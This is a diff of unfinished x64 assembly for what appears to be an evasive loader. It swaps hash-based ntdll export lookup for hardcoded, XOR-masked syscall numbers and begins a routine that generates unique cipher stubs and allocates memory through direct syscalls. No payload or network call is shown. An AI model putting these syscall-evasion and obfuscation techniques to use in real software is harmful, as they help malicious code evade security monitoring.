@@ -267,20 +267,24 @@ hash_gcd        equ            0x00000000 xor random_mask   ; GetCurrentDirec.
 hash_fff        equ            0x00000000 xor random_mask   ; FindFirstFile
 hash_fnf        equ            0x00000000 xor random_mask
 
+max_stub_size   equ            0xffff
+
 ;
 ; Data structures
 ;
 dynimp struct                               ; our dynamic import table          ;
     ntavm   qword ?
     ntpvm   qword ?
+    cfw     qword ?                         ; CreateFileW
     len     dword ?                         ; number of entries                 ;
 dynimp ends                                                                     ;
 
 ;
 ; Function Prototypes
 ;                                                                             
-setup_syscalls  proto :qword
 find_bytes      proto :qword, :qword, :qword, :qword
+
+
 ;                                                                               ;
 ; ----------------------------------------------------------------------------- ;
 ;                               Executable Code                                 ;
@@ -314,10 +318,11 @@ text segment align(16) 'code' read execute ;                                   ;
 ;
 start proc fastcall
     local   dimp:dynimp
-    sethash rax, hash_ntavm
-    mov     rcx, dimp
-    invoke  setup_syscalls, rcx
-
+    mov     [dimp].dynimp.ntavm, 0x18 xor random_mask
+    mov     [dimp].dynimp.ntpvm, 0x50 xor random_mask
+    lea     rcx, dimp
+    lea     rdx, [dimp].dynimp.cfw
+    call    genstub
     ret   
 start endp
 
@@ -327,65 +332,28 @@ genimps proc dimp:qword
 genimps endp
 
 ; Generate a unique cipher stub for the address
-genstub proc p_api:qword
+genstub proc 
+    local   buf:qword
+; allocate memory for the stub
+    mov     rbx, [rcx].dynimp.ntavm
+    or      rcx, 0xffffffffffffffff
+    lea     rdx, buf
+    xor     r8, r8
+    mov     r9, max_stub_size
+    push    mem_commit or mem_reserve
+    push    page_readwrite
+    and     rsp, not 8
+    call    exec_syscall
     ret
 genstub endp
-
-setup_syscalls proc dimp:qword
-    local   @rbx:qword
-    local   @rsi:qword
-    local   @rdi:qword
-    mov     @rbx, rbx
-    mov     @rsi, rsi
-    mov     @rdi, rdi
-    mov     rdi, rcx
-    sethash rcx, hash_ntdll                 ; encoded hash of `ntdll.dll`       ;
-   ;mov     rcx, hash_ntdll                 
-    call    getmod                          ; get module base of ntdll.dll      ;
-    mov     rsi, rax                        ; save ntdll base                   ;
-    mov     rcx, rax                        ; rcx is the module base            ;
-    sethash rdx, hash_ntavm     
-   ;mov     rdx, hash_ntavm                 ; rdx encoded function hash         ;
-    call    getexp                          ; resolve address by hash           ;
-    mov     rcx, rax                        ; pass NtAllocateVirtualMemory addr ;
-    call    validate_scn                    ; get syscall number/address        ;
-    test    eax, eax
-    jnz     _set_ntavm          
-    mov     eax, 0x18                       ; raw value is same across win10    ;
-_set_ntavm:
-    xor     rax, random_mask                ; encode it                         ;
-    mov     [dimp].dynimp.ntavm, rax        ; store in dynamic import table     ;
-    mov     rcx, rsi                        ; reload ntdll base                 ;
-    sethash rdx, hash_ntpvm
-   ;mov     rdx, hash_ntpvm                 ; NtProtectVirtualMemory hash       ;
-    call    getexp                          ; resolve ntpvm by hash             ;
-    mov     rcx, rax                        ; pass NtProtectVirtualMemory addr  ;
-    call    validate_scn                    ; get syscall number/address        ;
-    test    eax, eax
-    jnz     _set_ntpvm
-    mov     eax, 0x50                       ; raw value is same across win10    ;
-_set_ntpvm:
-    xor     rax, random_mask                ; encode it                         ;
-    mov     [dimp].dynimp.ntpvm, rax        ; store in dynamic import table     ;
-    clobber_regs
-    mov     rbx, @rbx
-    mov     rsi, @rsi                   
-    mov     rdi, @rdi
-    ret
-setup_syscalls endp
 
 ; Invoke either a system call export address or raw syscall number from rbx
 ; If this fails inexplicably, check stack alignment
 exec_syscall proc
     xor     rbx, random_mask
-    cmp     ebx, 0xfff
-    jg      _ptr
     mov     r10, rcx
     mov     eax, ebx
     syscall
-    jmp     _done
-_ptr:
-    call    rbx
 _done:
     ret
 exec_syscall ENDP
